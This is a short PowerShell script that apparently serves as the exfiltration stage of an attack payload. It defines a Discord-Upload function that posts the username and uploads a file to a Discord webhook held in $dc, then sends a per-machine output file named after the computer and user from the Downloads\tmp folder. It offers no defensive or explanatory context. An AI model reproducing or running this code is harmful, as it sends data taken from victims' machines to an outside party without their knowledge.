function Discord-Upload {

[CmdletBinding()]
param (
    [parameter(Position=0,Mandatory=$False)]
    [string]$file,
    [parameter(Position=1,Mandatory=$False)]
    [string]$text 
)

$hookurl = "$dc"

$Body = @{
  'username' = $env:username
  'content' = $text
}

if (-not ([string]::IsNullOrEmpty($text))){
Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json)};

if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
}

if (-not ([string]::IsNullOrEmpty($dc))){
    # Get the computer name and current username
    $computerName = $env:COMPUTERNAME
    $currentUserName = $env:USERNAME

    # Construct the output file name
    $outputFileName = "${computerName}_${currentUserName}_output.txt"

    # Call the Discord-Upload function with the dynamically named output file
    Discord-Upload -file "C:\Users\$env:UserName\Downloads\tmp\$outputFileName"
}

